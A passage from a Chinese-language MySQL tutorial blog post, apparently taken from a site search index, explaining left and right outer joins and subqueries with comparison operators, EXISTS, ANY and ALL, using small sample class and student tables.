<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">class</span>.cid,<span class="keyword">class</span>.cname,student.sname <span class="keyword">from</span> <span class="keyword">class</span> <span class="title class_">left</span> <span class="keyword">outer</span> <span class="keyword">join</span> student on <span class="keyword">class</span>.cid=student.classid;</span><br></pre></td></tr></table></figure>
<p>运行效果展示</p>
<p><img src="/posts/c826a854//1aa93ef85390eaa0e11bbb16fefeedb6.png" alt="在这里插入图片描述"></p>
<p><font class="notice">展示结果分析：<br>
1、分别找出Java班、C++班、Python班的学生 <br>2、右表的Jack不满足查询条件故其没有出现在查询结果中 <br>3、虽然左表的PHP班没有学生，但是任然显示了PHP的信息；但是，它对应的学生名字为NULL</font></p>
<ol start="2">
<li class="lvl-3">
<p>右（外）连接查询</p>
</li>
</ol>
<p>右(外)连接的结果包括RIGHT JOIN子句中指定的右表的所有记录，以及所有满足连接条件的记录。如果右表的某条记录在左表中没有匹配，则左表将返回空值。</p>
<p>查询每个班的班级ID、班级名称及该班的所有学生的名字 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">class</span>.cid,<span class="keyword">class</span>.cname,student.sname <span class="keyword">from</span> <span class="keyword">class</span> <span class="title class_">right</span> <span class="keyword">outer</span> <span class="keyword">join</span> student on <span class="keyword">class</span>.cid=student.classid;</span><br></pre></td></tr></table></figure>
<p>运行效果展示</p>
<p><img src="/posts/c826a854//dd82b94cb3886aaa58c04a9cf89c38eb.png" alt="在这里插入图片描述"></p>
<p><font class="notice">展示结果分析：<br><br>
1、分别找出Java班、C++班、Python班的学生<br><br>
2、左表的PHP班不满足查询条件故其没有出现在查询结果中<br><br>
3、虽然右表的jack没有对应班级，但是任然显示王跃跃的信息；但是，它对应的班级以及班级编号均为NULL</font></p>
<h2 id="子查询">子查询</h2>
<p>子查询是指一个查询语句嵌套在另一个查询语句内部的查询；该查询语句可以嵌套在一个 SELECT、SELECT…INTO、INSERT…INTO等语句中。在执行查询时，首先会执行子查询中的语句，再将返回的结果作为外层查询的过滤条件。在子査询中通常可以使用比较运算符和IN、EXISTS、ANY、ALL等关键字。</p>
<p>准备数据，代码如下：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> student;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="keyword">class</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建班级表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">class</span>(</span><br><span class="line">  cid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>, </span><br><span class="line">  cname <span class="type">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建学生表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student (</span><br><span class="line">  sid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>, </span><br><span class="line">  sname <span class="type">varchar</span> (<span class="number">20</span>), </span><br><span class="line">  sage <span class="type">int</span> (<span class="number">2</span>), </span><br><span class="line">  classid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向班级表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1001</span>,<span class="string">&#x27;Java&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1002</span>,<span class="string">&#x27;C++&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1003</span>,<span class="string">&#x27;Python&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1004</span>,<span class="string">&#x27;PHP&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1005</span>,<span class="string">&#x27;Android&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向学生表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;张三&#x27;</span>,<span class="number">20</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;李四&#x27;</span>,<span class="number">21</span>,<span class="number">1002</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">&#x27;王五&#x27;</span>,<span class="number">24</span>,<span class="number">1003</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">&#x27;赵六&#x27;</span>,<span class="number">23</span>,<span class="number">1004</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">5</span>,<span class="string">&#x27;小明&#x27;</span>,<span class="number">21</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">6</span>,<span class="string">&#x27;小红&#x27;</span>,<span class="number">26</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">7</span>,<span class="string">&#x27;小亮&#x27;</span>,<span class="number">27</span>,<span class="number">1002</span>);</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>带比较运算符的查询</p>
</li>
</ol>
<p>比较运算符前面我们提到过得，就是&gt;、&lt;、=、&gt;=、&lt;=、!=等</p>
<p>查询张三同学所在班级的信息 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">class</span> <span class="title class_">where</span> cid=(<span class="keyword">select</span> classid <span class="keyword">from</span> student <span class="keyword">where</span> sname=<span class="string">&#x27;张三&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>查询比张三同学所在班级编号还大的班级的信息 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">class</span> <span class="title class_">where</span> cid&gt;(<span class="keyword">select</span> classid <span class="keyword">from</span> student <span class="keyword">where</span> sname=<span class="string">&#x27;张三&#x27;</span>);</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>带EXISTS关键字的查询</p>
</li>
</ol>
<p>EXISTS关键字后面的参数可以是任意一个子查询， 它不产生任何数据只返回TRUE或FALSE。当返回值为TRUE时外层查询才会 执行</p>
<p>假如王五同学在学生表中则从班级表查询所有班级信息 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">class</span> <span class="title class_">where</span> <span class="keyword">exists</span> (<span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname=<span class="string">&#x27;王五&#x27;</span>);</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>带ANY关键字的子查询</p>
</li>
</ol>
<p>ANY关键字表示满足其中任意一个条件就返回一个结果作为外层查询条件。</p>
<p>查询比任一学生所属班级号还大的班级编号 MySQL命令：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * from <span class="class"><span class="keyword">class</span> <span class="title">where</span> <span class="title">cid</span> &gt; <span class="title">any</span> (<span class="title">select</span> <span class="title">classid</span> <span class="title">from</span> <span class="title">student</span>)</span>;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>带ALL关键字的子查询</p>
</li>
</ol>
<p>ALL关键字与ANY有点类似，只不过带ALL关键字的子査询返回的结果需同时满足所有内层査询条件。</p>
<p>查询比所有学生所属班级号还大的班级编号 MySQL命令：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * from <span class="class"><span class="keyword">class</span> <span class="title">where</span> <span class="title">cid</span> &gt; <span class="title">all</span> (<span class="title">select</span> <span class="title">classid</span> <span class="title">from</span> <span class="title">student</span>)</span>;</span><br></pre></td></tr></table></figure>
<p>关于外键</p>
<p>参考链接：</p>
<p><a href="https://blog.csdn.net/weixin_45851945/article/details/114287877">MySQL 有这一篇就够（呕心狂敲37k字，只为博君一点赞！！！）</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>MYSQL</tag>
      </tags>
  </entry>
</search>
